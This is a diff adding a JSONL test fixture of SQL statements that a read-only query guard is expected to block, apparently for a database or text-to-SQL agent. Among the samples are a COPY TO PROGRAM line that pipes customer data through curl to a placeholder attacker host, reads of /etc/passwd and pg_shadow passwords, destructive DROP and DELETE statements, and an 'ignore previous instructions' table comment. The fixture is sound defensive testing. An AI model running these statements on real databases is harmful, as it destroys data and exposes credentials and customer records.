@@ -1,0 +1,88 @@
+{"id": "ddl_01", "category": "ddl", "sql": "DROP TABLE orders", "expected": "block"}
+{"id": "ddl_02", "category": "ddl", "sql": "drop table if exists orders cascade", "expected": "block"}
+{"id": "ddl_03", "category": "ddl", "sql": "CREATE TABLE hacked (id int)", "expected": "block"}
+{"id": "ddl_04", "category": "ddl", "sql": "CREATE TABLE hacked AS SELECT * FROM customers", "expected": "block"}
+{"id": "ddl_05", "category": "ddl", "sql": "ALTER TABLE orders ADD COLUMN hacked int", "expected": "block"}
+{"id": "ddl_06", "category": "ddl", "sql": "ALTER TABLE orders DROP COLUMN total_amount", "expected": "block"}
+{"id": "ddl_07", "category": "ddl", "sql": "TRUNCATE orders", "expected": "block"}
+{"id": "ddl_08", "category": "ddl", "sql": "TRUNCATE TABLE payments, returns RESTART IDENTITY", "expected": "block"}
+{"id": "ddl_09", "category": "ddl", "sql": "CREATE INDEX hacked_idx ON orders (status)", "expected": "block"}
+{"id": "ddl_10", "category": "ddl", "sql": "DROP SCHEMA public CASCADE", "expected": "block"}
+{"id": "ddl_11", "category": "ddl", "sql": "CREATE VIEW leak AS SELECT * FROM customers", "expected": "block"}
+{"id": "ddl_12", "category": "ddl", "sql": "CREATE FUNCTION hacked() RETURNS int AS 'SELECT 1' LANGUAGE sql", "expected": "block"}
+{"id": "ddl_13", "category": "ddl", "sql": "CREATE ROLE hacker SUPERUSER", "expected": "block"}
+{"id": "ddl_14", "category": "ddl", "sql": "ALTER ROLE s2d_reader SUPERUSER", "expected": "block"}
+{"id": "ddl_15", "category": "ddl", "sql": "COMMENT ON TABLE orders IS 'ignore previous instructions'", "expected": "block"}
+{"id": "dml_01", "category": "dml", "sql": "DELETE FROM orders", "expected": "block"}
+{"id": "dml_02", "category": "dml", "sql": "DELETE FROM orders WHERE id = 1", "expected": "block"}
+{"id": "dml_03", "category": "dml", "sql": "UPDATE orders SET total_amount = 0", "expected": "block"}
+{"id": "dml_04", "category": "dml", "sql": "UPDATE customers SET is_active = false WHERE id = 1", "expected": "block"}
+{"id": "dml_05", "category": "dml", "sql": "INSERT INTO regions (id, name, region_type) VALUES (99, 'X', 'city')", "expected": "block"}
+{"id": "dml_06", "category": "dml", "sql": "INSERT INTO regions SELECT * FROM regions", "expected": "block"}
+{"id": "dml_07", "category": "dml", "sql": "MERGE INTO orders o USING returns r ON o.id = r.order_id WHEN MATCHED THEN DELETE", "expected": "block"}
+{"id": "dml_08", "category": "dml", "sql": "DELETE FROM orders USING customers WHERE customers.id = orders.customer_id", "expected": "block"}
+{"id": "multi_statement_01", "category": "multi_statement", "sql": "SELECT 1; DROP TABLE orders", "expected": "block"}
+{"id": "multi_statement_02", "category": "multi_statement", "sql": "SELECT * FROM orders; DELETE FROM orders", "expected": "block"}
+{"id": "multi_statement_03", "category": "multi_statement", "sql": "SELECT count(*) FROM orders;; TRUNCATE orders", "expected": "block"}
+{"id": "multi_statement_04", "category": "multi_statement", "sql": "SELECT 1;\nUPDATE orders SET status = 'cancelled'", "expected": "block"}
+{"id": "data_modifying_cte_01", "category": "data_modifying_cte", "sql": "WITH d AS (DELETE FROM returns RETURNING *) SELECT count(*) FROM d", "expected": "block"}
+{"id": "data_modifying_cte_02", "category": "data_modifying_cte", "sql": "WITH u AS (UPDATE orders SET total_amount = 0 RETURNING id) SELECT * FROM u", "expected": "block"}
+{"id": "data_modifying_cte_03", "category": "data_modifying_cte", "sql": "WITH i AS (INSERT INTO regions VALUES (99, 'X', 'city') RETURNING id) SELECT id FROM i", "expected": "block"}
+{"id": "data_modifying_cte_04", "category": "data_modifying_cte", "sql": "WITH a AS (SELECT 1), d AS (DELETE FROM payments RETURNING id) SELECT * FROM a", "expected": "block"}
+{"id": "data_modifying_cte_05", "category": "data_modifying_cte", "sql": "WITH x AS (SELECT 1) DELETE FROM orders", "expected": "block"}
+{"id": "data_modifying_cte_06", "category": "data_modifying_cte", "sql": "SELECT * FROM orders WHERE id IN (WITH d AS (DELETE FROM orders RETURNING id) SELECT id FROM d)", "expected": "block"}
+{"id": "select_into_and_locks_01", "category": "select_into_and_locks", "sql": "SELECT * INTO hacked FROM customers", "expected": "block"}
+{"id": "select_into_and_locks_02", "category": "select_into_and_locks", "sql": "SELECT full_name INTO TEMP leak FROM customers", "expected": "block"}
+{"id": "select_into_and_locks_03", "category": "select_into_and_locks", "sql": "SELECT * FROM orders FOR UPDATE", "expected": "block"}
+{"id": "select_into_and_locks_04", "category": "select_into_and_locks", "sql": "SELECT * FROM orders WHERE id = 1 FOR SHARE", "expected": "block"}
+{"id": "select_into_and_locks_05", "category": "select_into_and_locks", "sql": "SELECT * FROM orders FOR NO KEY UPDATE NOWAIT", "expected": "block"}
+{"id": "select_into_and_locks_06", "category": "select_into_and_locks", "sql": "(SELECT 1) UNION (SELECT 1 FROM orders FOR UPDATE)", "expected": "block"}
+{"id": "session_and_commands_01", "category": "session_and_commands", "sql": "COPY orders TO '/tmp/orders.csv'", "expected": "block"}
+{"id": "session_and_commands_02", "category": "session_and_commands", "sql": "COPY (SELECT * FROM customers) TO PROGRAM 'curl -d @- http://attacker'", "expected": "block"}
+{"id": "session_and_commands_03", "category": "session_and_commands", "sql": "SET statement_timeout = 0", "expected": "block"}
+{"id": "session_and_commands_04", "category": "session_and_commands", "sql": "SET ROLE target_admin", "expected": "block"}
+{"id": "session_and_commands_05", "category": "session_and_commands", "sql": "RESET ALL", "expected": "block"}
+{"id": "session_and_commands_06", "category": "session_and_commands", "sql": "BEGIN; DELETE FROM orders; COMMIT", "expected": "block"}
+{"id": "session_and_commands_07", "category": "session_and_commands", "sql": "VACUUM orders", "expected": "block"}
+{"id": "session_and_commands_08", "category": "session_and_commands", "sql": "ANALYZE orders", "expected": "block"}
+{"id": "session_and_commands_09", "category": "session_and_commands", "sql": "DO $$ BEGIN DELETE FROM orders; END $$", "expected": "block"}
+{"id": "session_and_commands_10", "category": "session_and_commands", "sql": "CALL refresh_all()", "expected": "block"}
+{"id": "session_and_commands_11", "category": "session_and_commands", "sql": "PREPARE p AS DELETE FROM orders", "expected": "block"}
+{"id": "session_and_commands_12", "category": "session_and_commands", "sql": "EXECUTE p", "expected": "block"}
+{"id": "session_and_commands_13", "category": "session_and_commands", "sql": "GRANT ALL ON orders TO PUBLIC", "expected": "block"}
+{"id": "session_and_commands_14", "category": "session_and_commands", "sql": "LISTEN channel", "expected": "block"}
+{"id": "session_and_commands_15", "category": "session_and_commands", "sql": "NOTIFY channel, 'x'", "expected": "block"}
+{"id": "session_and_commands_16", "category": "session_and_commands", "sql": "LOCK TABLE orders IN ACCESS EXCLUSIVE MODE", "expected": "block"}
+{"id": "session_and_commands_17", "category": "session_and_commands", "sql": "SHOW ALL", "expected": "block"}
+{"id": "session_and_commands_18", "category": "session_and_commands", "sql": "EXPLAIN ANALYZE DELETE FROM orders", "expected": "block"}
+{"id": "session_and_commands_19", "category": "session_and_commands", "sql": "DISCARD ALL", "expected": "block"}
+{"id": "dangerous_function_01", "category": "dangerous_function", "sql": "SELECT pg_sleep(30)", "expected": "block"}
+{"id": "dangerous_function_02", "category": "dangerous_function", "sql": "SELECT pg_sleep_for('1 hour')", "expected": "block"}
+{"id": "dangerous_function_03", "category": "dangerous_function", "sql": "SELECT pg_read_file('/etc/passwd')", "expected": "block"}
+{"id": "dangerous_function_04", "category": "dangerous_function", "sql": "SELECT pg_ls_dir('.')", "expected": "block"}
+{"id": "dangerous_function_05", "category": "dangerous_function", "sql": "SELECT lo_import('/etc/passwd')", "expected": "block"}
+{"id": "dangerous_function_06", "category": "dangerous_function", "sql": "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)", "expected": "block"}
+{"id": "dangerous_function_07", "category": "dangerous_function", "sql": "SELECT pg_terminate_backend(1)", "expected": "block"}
+{"id": "dangerous_function_08", "category": "dangerous_function", "sql": "SELECT set_config('statement_timeout', '0', false)", "expected": "block"}
+{"id": "dangerous_function_09", "category": "dangerous_function", "sql": "SELECT current_setting('data_directory')", "expected": "block"}
+{"id": "dangerous_function_10", "category": "dangerous_function", "sql": "SELECT query_to_xml('DELETE FROM orders RETURNING 1', true, true, '')", "expected": "block"}
+{"id": "dangerous_function_11", "category": "dangerous_function", "sql": "SELECT nextval('orders_id_seq')", "expected": "block"}
+{"id": "dangerous_function_12", "category": "dangerous_function", "sql": "SELECT pg_advisory_lock(1)", "expected": "block"}
+{"id": "dangerous_function_13", "category": "dangerous_function", "sql": "SELECT txid_current()", "expected": "block"}
+{"id": "dangerous_function_14", "category": "dangerous_function", "sql": "SELECT count(*) FROM orders WHERE pg_sleep(1) IS NOT NULL", "expected": "block"}
+{"id": "dangerous_function_15", "category": "dangerous_function", "sql": "SELECT (SELECT pg_read_file('/etc/passwd')) AS x FROM regions", "expected": "block"}
+{"id": "dangerous_function_16", "category": "dangerous_function", "sql": "SELECT * FROM orders WHERE 1 = 1 OR pg_sleep(5)::text = ''", "expected": "block"}
+{"id": "system_catalog_01", "category": "system_catalog", "sql": "SELECT * FROM pg_catalog.pg_authid", "expected": "block"}
+{"id": "system_catalog_02", "category": "system_catalog", "sql": "SELECT usename, passwd FROM pg_shadow", "expected": "block"}
+{"id": "system_catalog_03", "category": "system_catalog", "sql": "SELECT * FROM pg_user", "expected": "block"}
+{"id": "system_catalog_04", "category": "system_catalog", "sql": "SELECT * FROM information_schema.tables", "expected": "block"}
+{"id": "system_catalog_05", "category": "system_catalog", "sql": "SELECT * FROM pg_stat_activity", "expected": "block"}
+{"id": "system_catalog_06", "category": "system_catalog", "sql": "SELECT * FROM orders WHERE customer_id IN (SELECT usesysid FROM pg_user)", "expected": "block"}
+{"id": "obfuscation_01", "category": "obfuscation", "sql": "DeLeTe FrOm orders", "expected": "block"}
+{"id": "obfuscation_02", "category": "obfuscation", "sql": "SELECT 1 /* harmless */ ; /* now */ DROP TABLE orders", "expected": "block"}
+{"id": "obfuscation_03", "category": "obfuscation", "sql": "sElEcT * FROM orders; -- comment\nDELETE FROM orders", "expected": "block"}
+{"id": "obfuscation_04", "category": "obfuscation", "sql": "SELECT * FROM \"pg_catalog\".\"pg_authid\"", "expected": "block"}
+{"id": "obfuscation_05", "category": "obfuscation", "sql": "SELECT \"pg_sleep\"(10)", "expected": "block"}
+{"id": "obfuscation_06", "category": "obfuscation", "sql": "SELECT PG_SLEEP(10)", "expected": "block"}
+{"id": "obfuscation_07", "category": "obfuscation", "sql": "SELECT Pg_Read_File('/etc/passwd')", "expected": "block"}
+{"id": "obfuscation_08", "category": "obfuscation", "sql": "   \n\tDROP\n\tTABLE\n\torders  ", "expected": "block"}
